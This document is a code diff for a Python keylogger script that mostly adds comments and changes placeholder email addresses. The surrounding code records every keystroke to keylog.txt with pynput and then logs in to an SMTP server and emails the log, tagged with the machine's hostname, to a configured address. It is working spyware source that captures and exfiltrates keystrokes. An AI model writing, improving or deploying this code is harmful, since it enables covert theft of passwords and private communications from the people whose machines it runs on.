@@ -8,23 +8,26 @@ from email.mime.application import MIMEApplication
 import socket
 from win10toast import ToastNotifier
 
-EXIT_COMBINATION = {Key.ctrl_l, Key.f12}    # Press [L CTRL] + [F12] to stop keylogger
-PORT = 465                                  # Specify port number (465 or 587 recommended)
-SMTP_SERVER = "smtp.gmail.com"              # Specify SMTP server
-TO_ADDR = "your_email@domain.com"           # Specify recipient email address
-FROM_ADDR = "your_email@domain.com"         # Specify sender email address
+EXIT_COMBINATION = {Key.ctrl_l, Key.f12}    # Press [LCTRL] + [F12] to stop keylogger
+PORT = 465                                  # Specify port number here (465 or 587 recommended)
+SMTP_SERVER = "smtp.gmail.com"              # Specify SMTP server here
+TO_ADDR = "user@domain.com"                 # Specify recipient email address
+FROM_ADDR = "user@domain.com"               # Specify sender email address
 PASSWORD = "your_password"                  # Specify sender email account password
 HOSTNAME = socket.gethostname()
 SUBJECT = HOSTNAME + " // keylogger.py"     # Specify email subject
 CONTENT = "see keylog.txt attached"         # Specify email body
 active_keys = set()
 
+# Record keystrokes in keylog.txt
 def log(text):
     with open("keylog.txt", "a") as f:
         f.write(str(text))
         f.close()
-        
+
+# Send email with keylog.txt
 def email_log():
+    # Set messgae header and body
     msg = MIMEMultipart()
     msg["To"] = TO_ADDR
     msg["From"] = FROM_ADDR
@@ -32,18 +35,21 @@ def email_log():
     body = MIMEText(CONTENT, "plain")
     msg.attach(body)
     
+    # Attach keylog.txt to email
     file = "keylog.txt"
     with open(file, "r") as f:
         attachment = MIMEApplication(f.read(), Name = basename(file))
-        attachment["Content-Disposition"] = "attachment"; file = "{}".format(basename(file))
+        attachment["Content-Disposition"] = "attachment"; file = f"{basename(file)}"
     msg.attach(attachment)
     
+    # Connect to SMTP server and send message
     server = smtplib.SMTP_SSL(SMTP_SERVER, PORT)
     server.login(FROM_ADDR, PASSWORD)
     server.send_message(msg, from_addr = FROM_ADDR, to_addrs = [TO_ADDR])
     print("Email Sent to ", TO_ADDR)
     server.quit()
 
+# Detect keystrokes
 def on_press(key):
     if key in EXIT_COMBINATION:
         active_keys.add(key)
@@ -74,6 +80,7 @@ def on_release(key):
 with open("keylog.txt", "w") as f:
     f.close()
 
+# Log start time and date
 start_date = datetime.now()
 start_minute = str(start_date.minute)
 if len(start_minute) == 1:
@@ -86,6 +93,7 @@ log("-----------------------------\n")
 with Listener(on_press = on_press, on_release = on_release) as listener:
     listener.join()
 
+# Log end time and date
 end_date = datetime.now()
 end_minute = str(end_date.minute)
 if len(end_minute) == 1:
@@ -98,4 +106,5 @@ log("-----------------------------\n")
 '''Windows 10 notification when keylogger is stopped.'''
 # ToastNotifier().show_toast("Python Keylogger", "Keylogger stopped.", duration = 15)
 
+# Send email once log is closed
 email_log()
